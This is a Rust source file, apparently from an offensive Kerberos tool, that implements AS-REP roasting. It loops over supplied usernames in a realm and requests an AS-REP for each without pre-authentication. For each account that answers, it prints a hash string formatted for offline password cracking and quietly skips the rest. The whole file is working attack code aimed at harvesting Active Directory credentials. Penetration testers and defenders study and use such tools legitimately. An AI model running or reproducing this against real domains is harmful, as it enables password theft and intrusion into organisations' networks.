use crate::core::request_as_rep;
use crate::core::KrbUser;
use crate::core::{as_rep_to_crack_string, CrackFormat};
use crate::error::{Error, Result};
use crate::transporter::KerberosTransporter;
use log::warn;

pub fn asreproast(
    realm: &str,
    usernames: Vec<String>,
    crack_format: CrackFormat,
    transporter: &dyn KerberosTransporter,
    etype: Option<i32>,
) -> Result<()> {
    for username in usernames.iter() {
        let user = KrbUser::new(username.clone(), realm.to_string());

        let result =
            request_as_rep(user, None, etype.map(|e| vec![e]), &*transporter);

        match result {
            Ok(as_rep) => {
                let crack_str =
                    as_rep_to_crack_string(username, &as_rep, crack_format);
                println!("{}", crack_str)
            }
            Err(err) => match &err {
                Error::KrbError(_) => {}
                Error::IOError(_, _) => return Err(err),
                Error::String(_) => warn!("{}", err),
                Error::DataError(_) => warn!("{}", err),
            },
        }
    }

    return Ok(());
}
